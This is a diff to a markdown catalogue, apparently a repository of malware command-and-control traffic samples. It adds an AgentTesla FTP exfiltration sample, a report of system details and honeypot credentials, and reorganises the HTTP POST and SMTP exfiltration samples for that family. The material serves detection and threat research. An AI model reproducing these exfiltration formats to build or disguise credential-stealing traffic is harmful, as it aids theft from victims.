@@ -21,7 +21,24 @@ Content-Length: 0
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/acbackdoor.png "ACBackdoor")
 
-#### AgentTesla http:
+#### AgentTesla
+ftp:
+~~~
+<html>Time: 11/25/2019 17:48:57<br>User Name: admin<br>Computer Name: USER-PC<br>OSFullName: Microsoft Windows 7 Professional <br>CPU: Intel(R) Core(TM) i5-6400 CPU @ 2.70GHz<br>RAM: 4095.61 MB<br><hr>URL:https://www.facebook.com/<br>
+Username:honey@pot.com<br>
+Password:honeypass356<br>
+Application:Chrome<br>
+<hr>
+URL:192.168.1.1<br>
+Username:honey@pot.com<br>
+Password:honeypass356<br>
+Application:Outlook<br>
+<hr>
+</html>
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/agentteslaftp.png "AgentTesla FTP")
+
+http:
 ~~~
 POST /zin/WebPanel/api.php HTTP/1.1
 User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)
@@ -37,7 +54,7 @@ p=G1DZYwdIiDZ6V83seaZCmTT0wiCyOlXVS0OEx4YpkUAOuKO/6hfQJ%2BZD2LjpTbyu9w0gudjYXCIc
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/agenttesla-http.png "AgentTesla HTTP")
 
-#### AgentTesla smtp exil:
+smtp exil:
 ~~~
 From: office@larbaxpo[.]com
 To: officelogs@larbaxpo[.]com
